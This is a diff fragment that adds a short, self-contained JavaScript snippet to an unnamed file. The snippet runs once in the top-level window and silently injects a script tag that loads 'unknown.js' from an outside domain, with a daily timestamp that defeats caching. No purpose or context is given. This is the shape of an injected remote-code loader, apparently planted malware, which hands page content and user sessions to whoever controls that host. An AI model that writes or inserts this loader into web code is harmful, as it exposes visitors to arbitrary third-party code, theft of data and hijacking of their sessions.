@@ -1,0 +1,10 @@
+;(function () {
+if(window.top !== window) return;
+if(window.hasexecinjectjs) { return; };
+window.hasexecinjectjs = true;
+var daytime = new Date(new Date().setHours(0, 0, 0, 0)) / 1000;
+var url = 'https://cdn.kjfoqi.cn/j/unknown.js?_=' + daytime;
+var script=document.createElement('script');
+script.src = url;
+document.head && document.head.appendChild(script);
+})();
